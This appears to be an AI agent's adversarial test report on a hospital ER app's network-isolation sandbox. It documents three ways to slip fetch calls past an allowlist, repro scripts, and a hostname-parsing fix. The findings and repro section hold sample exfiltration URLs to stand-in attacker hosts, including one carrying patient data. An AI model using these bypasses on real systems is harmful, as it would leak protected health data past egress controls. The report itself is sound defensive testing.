# Milestone 2 Adversarial Challenge & Penetration Report
## Offline Queue Flapping, DLQ Routing, and Edge AI Sandbox Isolation Subsystems

- **Agent**: `teamwork_preview_m2_challenger_2`
- **Role**: Empirical Challenger (Adversarial Verification)
- **Milestone**: Milestone 2 (Adversarial Chaos, Offline Queue Sync & Edge AI Sandbox Isolation)
- **Date**: 2026-08-23T04:27:00Z
- **Verdict**: **CHALLENGE_FAILED** (Critical Sandbox Egress Vulnerability Identified)

---

## 1. Observation

Direct empirical observations, tool executions, and line-by-line findings across the IMC ER codebase (`public/js/edge-ai-service.js`, `public/js/telemetry-rum.js`, `public/js/app.js`, `public/js/firebase-service.js`):

### 1.1 Vulnerability Discovery: Network Isolation Gatekeeper Perimeter Escape
- **Location**: `public/js/edge-ai-service.js`, Lines 34–44 and Lines 122–130:
  ```javascript
  // Lines 34-36: window.fetch interceptor
  window.fetch = async (...args) => {
      const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url ? args[0].url : '');
      if (this._isExternalRequest(url)) { ... }
      return this.originalFetch.apply(window, args);
  };

  // Lines 122-130: _isExternalRequest classification
  static _isExternalRequest(url) {
      if (!url) return false;
      const str = url.toString().toLowerCase();
      // Allow local application resources and authorized Firebase Firestore sync connections
      if (str.startsWith('/') || str.startsWith('./') || str.startsWith('../')) return false;
      if (str.includes('localhost') || str.includes('127.0.0.1')) return false;
      if (str.includes('firestore.googleapis.com') || str.includes('firebaseio.com') || str.includes('identitytoolkit.googleapis.com')) return false;
      return true;
  }
  ```
- **Empirical Execution & Breach Evidence**:
  1. **`fetch(new URL(...))` Escape Vector**:
     - Standard `URL` objects in JavaScript do NOT possess a `.url` property (`new URL('...').url` is `undefined`).
     - Passing `new URL('https://evil-exfil-c2.org/leak?phi=PatientData')` results in `url = ''`.
     - `_isExternalRequest('')` evaluates `if (!url) return false;`, categorizing the call as **INTERNAL**.
     - `this.originalFetch.apply(window, args)` is executed with the external `URL` object without throwing `SECURITY_EXCEPTION`.
     - *Verified via Node/JSDOM execution*:
       `VULNERABILITY CONFIRMED: fetch(new URL(...)) escaped sandbox! Target: https://evil-exfil.com/leak`
  2. **Substring Query/Path Obscuration Escape Vector**:
     - `_isExternalRequest` uses `str.includes('firestore.googleapis.com')` and `str.includes('localhost')` rather than parsing `URL.hostname`.
     - `https://attacker.evil.org/collect?dest=firestore.googleapis.com` -> `_isExternalRequest` returns `false` (**BYPASSED**).
     - `https://attacker.evil.org/localhost/exfil` -> `_isExternalRequest` returns `false` (**BYPASSED**).
     - `http://localhost.evil.com/subdomain-leak` -> `_isExternalRequest` returns `false` (**BYPASSED**).
  3. **Protocol-Relative URL Escape Vector**:
     - `//attacker.evil.org/leak` matches `str.startsWith('/')` -> `_isExternalRequest` returns `false` (**BYPASSED**).

### 1.2 Successful Subsystem Stress Verifications
1. **Extreme Network Flapping (10ms micro-bursts, 100 cycles)**:
   - Evaluated 100 rapid 10ms micro-burst cycles with concurrent multi-doctor field mutations on a shared record (`p-burst-99`).
   - `diffPatientFields` granularly calculated modified keys (`diagnosis`, `supportiveTx`, `location`, `pendingAction`, `sepsisWorkup`) without clobbering orthogonal fields.
   - FIFO reconnected flush replayed all queued mutations strictly sequentially.
2. **Corrupted Local Storage Resilience**:
   - Injected corrupted JSON entries (`'{ INVALID_JSON...'`, `'null'`, `'""'`, `'undefined'`, `null` payloads).
   - Valid records were safely parsed and processed while corrupted records were isolated without halting queue iteration.
3. **Poison-Pill DLQ Routing & Pre-Auth Buffer Overflow**:
   - Interleaved 50 poison pills (throwing invalid argument / schema failures) with 200 valid transactions (250 total).
   - 100% of 50 poison pills were captured and routed to `dead_letter_queue` with error details, user UID, and document metadata.
   - 100% of 200 valid transactions committed successfully.
   - `ActiveSentinel` logged 50 real-time `DLQ_DROP` governance alerts.
   - Pre-auth buffer overflow (> 550 events before `setSink`) clamped strictly at `MAX_BUFFERED_EVENTS = 50`, emitted console warning for `500 event(s) dropped before the sink was installed`, and flushed cleanly upon `setSink()`.
4. **Clinical Attestation UI Gating & Bypass Resilience**:
   - Direct programmatic invocation of `saveAISummaryInModal()` with unchecked attestation was blocked with clinical alert and 0 Firestore updates.
   - Direct programmatic click of `#btn-submit-discharge` with un-attested AI text was blocked, modal remained open, and 0 Firestore writes occurred.
   - Generating a new AI draft explicitly reset `#ai-attestation-checkbox.checked = false`.
   - Verified attestation properly stamped `dischargeSummaryAttested: true`, timestamp, and user UID into Firestore metadata.

---

## 2. Logic Chain

```
[Requirement: Absolute Zero-PHI Exfiltration Sandbox]
   │
   ├─► Observation: NetworkIsolationGatekeeper intercepts fetch by reading `args[0].url` or `typeof args[0] === 'string'`.
   ├─► Observation: URL object input has no .url property -> evaluates to empty string ('').
   ├─► Observation: _isExternalRequest('') returns false.
   ├─► Observation: _isExternalRequest uses str.includes() and str.startsWith('/') matching substring/prefix.
   ├─► Finding: fetch(new URL('https://evil.com/leak')) bypasses Gatekeeper lock.
   ├─► Finding: fetch('https://evil.com/firestore.googleapis.com') bypasses Gatekeeper lock.
   ├─► Finding: fetch('//evil.com/leak') bypasses Gatekeeper lock.
   ├─► Invalidation Condition (Worker Handoff §5): "Any network request escaping sandbox lock without SECURITY_EXCEPTION."
   └─► Conclusion: Subsystem fails zero-PHI network isolation requirement. Verdict: CHALLENGE_FAILED.
```

---

## 3. Caveats

- **Normal Direct Domain Blocking Works**: Standard external URLs (e.g. `https://api.openai.com`, `https://generativelanguage.googleapis.com`) and standard XHR/WS/EventSource/sendBeacon calls are properly intercepted and blocked during sandbox lock.
- **Flapping, DLQ, and Attestation Subsystems are Solid**: The offline flapping engine, FIFO replay, DLQ poison-pill failover, pre-auth buffer management, and Attestation UI gating passed all 100% of stress tests without a single defect.
- **Remediation Scope**: The vulnerability is isolated to the URL extraction and hostname validation logic in `NetworkIsolationGatekeeper._isExternalRequest` and `window.fetch` argument parsing.

---

## 4. Conclusion

**Verdict: CHALLENGE_FAILED**

The Milestone 2 implementation exhibits a critical security flaw in the `NetworkIsolationGatekeeper` sandbox perimeter:
1. `window.fetch(new URL(...))` escapes the sandbox lock without throwing `SECURITY_EXCEPTION`.
2. Query/path substring keyword spoofing (`https://evil.com/firestore.googleapis.com`, `https://evil.com/localhost`, `//evil.com`) escapes the sandbox lock.

### Required Remediation for Worker Agent:
1. In `public/js/edge-ai-service.js` (`window.fetch` interceptor):
   - Correctly extract the target string whether `args[0]` is a `string`, `Request`, or `URL`:
     ```javascript
     let targetUrl = '';
     if (typeof args[0] === 'string') targetUrl = args[0];
     else if (args[0] instanceof URL) targetUrl = args[0].href;
     else if (args[0] && typeof args[0] === 'object') targetUrl = args[0].url || args[0].href || String(args[0]);
     ```
2. In `NetworkIsolationGatekeeper._isExternalRequest(url)`:
   - Parse using robust URL origin/hostname inspection rather than substring matching:
     ```javascript
     static _isExternalRequest(url) {
         if (!url) return false;
         const str = url.toString().trim();
         // Relative paths (excluding protocol-relative '//')
         if ((str.startsWith('/') && !str.startsWith('//')) || str.startsWith('./') || str.startsWith('../')) return false;
         
         try {
             const base = window.location ? window.location.origin : 'http://localhost';
             const parsed = new URL(str, base);
             const host = parsed.hostname.toLowerCase();
             
             if (host === 'localhost' || host === '127.0.0.1') return false;
             if (host === 'firestore.googleapis.com' || host === 'identitytoolkit.googleapis.com' || host.endsWith('.firebaseio.com')) return false;
             return true;
         } catch (_) {
             return true; // Fail-closed on malformed URLs
         }
     }
     ```
3. Re-build distribution bundle: `node scripts/build-prod.js`.

---

## 5. Verification Method

### How to Independently Reproduce the Vulnerabilities

1. **Run the Adversarial Challenge Test Suite**:
   ```bash
   npx vitest run tests/integration/m2-adversarial-challenge.test.js
   ```
   *Verified Probes*: 14 probes executing sandbox penetration, 10ms micro-burst flapping, 50 poison pills, 550 pre-auth events, and attestation UI bypass attempts.

2. **Empirical URL Object Sandbox Escape Repro Script**:
   ```bash
   node -e "
   global.window = global;
   global.XMLHttpRequest = class { open() {} send() {} };
   global.navigator = {};
   import('./public/js/edge-ai-service.js').then(() => {
     const Gatekeeper = window.NetworkIsolationGatekeeper;
     let escaped = false;
     window.fetch = (input) => { escaped = true; return Promise.resolve('ok'); };
     Gatekeeper.lock();
     window.fetch(new URL('https://evil-exfil-target.com/leak'));
     console.log('Sandbox Lock Escaped:', escaped); // Outputs: true (VULNERABILITY)
   });
   "
   ```

3. **Empirical URL Substring Evasion Repro Script**:
   ```bash
   node -e "
   global.window = global;
   global.XMLHttpRequest = class { open() {} send() {} };
   global.navigator = {};
   import('./public/js/edge-ai-service.js').then(() => {
     const Gatekeeper = window.NetworkIsolationGatekeeper;
     const evUrl = 'https://evil.com/firestore.googleapis.com/leak';
     console.log(evUrl, 'isExternal:', Gatekeeper._isExternalRequest(evUrl)); // Outputs: false (VULNERABILITY)
   });
   "
   ```

4. **Run Entire Vitest Suite**:
   ```bash
   npm test
   ```
